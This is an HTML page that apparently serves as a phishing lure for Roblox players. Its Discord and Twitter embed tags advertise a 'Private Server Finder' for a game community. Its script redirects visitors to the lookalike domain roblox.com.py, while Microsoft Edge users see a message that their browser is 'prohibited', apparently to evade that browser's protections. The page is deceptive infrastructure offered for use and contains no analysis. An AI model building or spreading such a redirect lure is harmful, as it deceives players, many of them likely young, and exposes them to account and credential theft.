<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirecting...</title>

  <!-- Open Graph meta tags for Discord embeds -->
  <meta property="og:title" content="Private Server Finder" />
  <meta property="og:description" content="The best website to find a private server with luck or secrets." />
  <meta property="og:url" content="https://roblox.com.py/users/5966623949/profile" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="Steal A Brainrot Community" />
  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Blue_square.svg/1200px-Blue_square.svg.png" />

  <!-- Optional Twitter card for broader compatibility -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Private Server Finder" />
  <meta name="twitter:description" content="The best website to find a private server with luck or secrets." />
  <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Blue_square.svg/1200px-Blue_square.svg.png" />

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 2em;
      background-color: #fff;
    }
    .warning {
      color: red;
      font-size: 2em;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="content"></div>

  <script>
    function handleBrowserRedirect() {
      const userAgent = navigator.userAgent;
      const isEdge = userAgent.includes("Edg/");

      if (isEdge) {
        document.getElementById("content").innerHTML = 
          '<div class="warning">Please use another search for join, Microsoft Edge is prohibited.</div>';
      } else {
        // Redirect if not using Edge
        window.location.href = "https://roblox.com.py/users/5966623949/profile";
      }
    }

    handleBrowserRedirect();
  </script>
</body>
</html>
